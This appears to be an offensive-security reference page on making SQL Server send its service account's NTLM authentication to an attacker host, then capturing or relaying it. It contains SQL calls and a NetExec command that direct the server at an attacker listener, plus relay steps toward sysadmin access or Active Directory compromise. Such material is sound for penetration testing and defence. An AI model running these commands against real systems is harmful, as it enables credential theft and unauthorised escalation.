---
title: "MSSQL coercion and relay: stealing the service account's authentication"
description: "Using SQL Server procedures like xp_dirtree and xp_fileexist to force the instance to authenticate to an attacker over SMB, capturing or relaying the service account's NetNTLM to escalate across MSSQL instances or into Active Directory."
keywords:
  - xp_dirtree
  - xp_fileexist
  - NTLM relay
  - MSSQL coercion
  - service account
---

# Coercion and relay

SQL Server will reach out to a **UNC path** on command, and any `public` login can usually make it do so through `xp_dirtree` or `xp_fileexist`. Point that path at an attacker listener and the instance **authenticates with its service account** over SMB, handing you a NetNTLM response to [capture](../../directory/active-directory/authentication/ntlm/net-ntlm-capture-and-poisoning.md) and crack or, far better, to [relay](../../directory/active-directory/authentication/ntlm/relay.md). This turns a low-privilege database session into movement across instances or into the domain, without any sysadmin right.

## Triggering the outbound authentication

```sql
-- any public login can usually call these; the UNC target is attacker-controlled
EXEC xp_dirtree '\\<attacker>\share', 1, 1;
EXEC xp_fileexist '\\<attacker>\share\x';
EXEC master.dbo.xp_subdirs '\\<attacker>\share';
```

```bash
# NetExec coerces the authentication for you
nxc mssql <target> -u user -p pass -M mssql_coerce -o LISTENER=<attacker-ip>
```

## What to do with the coerced authentication

- **Relay to another MSSQL** where the service account is privileged: relaying the service account's connection to a second instance can promote you to sysadmin there.
- **Relay to LDAP / AD CS**: the MSSQL service often runs as a domain account, so its coerced authentication feeds RBCD, shadow credentials, or a certificate exactly like any other [coerced](../../directory/active-directory/authentication/ntlm/coercion.md) domain authentication.
- **Capture and crack** the NetNTLM where the service account password is weak.

## Exploitation notes

- The coercion needs only **`public`**, so it works from the lowest foothold and before any escalation inside the engine.
- The value depends on the **service account**: a domain service account makes this an Active Directory relay primitive, not just a database trick.
- `ntlmrelayx` supports relaying to MSSQL targets directly, so an MSSQL-to-MSSQL relay is a self-contained privilege escalation across instances.
- Combine with [enumeration](enumeration.md) to pick a relay target where the coerced account is sysadmin.

## Tools

- **NetExec `mssql`** (`-M mssql_coerce`): trigger the outbound authentication.
- **Impacket `mssqlclient.py`**: call `xp_dirtree`/`xp_fileexist` interactively.
- **ntlmrelayx.py**: relay the coerced service-account authentication to MSSQL, LDAP, or AD CS.

## References

- [Compass Security: relaying NTLM to MSSQL](https://blog.compass-security.com/2023/10/relaying-ntlm-to-mssql/)
- [0xdeaddood: relaying everything, coercing authentications episode 1, MSSQL](https://0xdeaddood.rocks/2023/02/28/relaying-everything-coercing-authentications-episode-1-mssql/)
- [HackTricks: pentesting MSSQL](https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html)
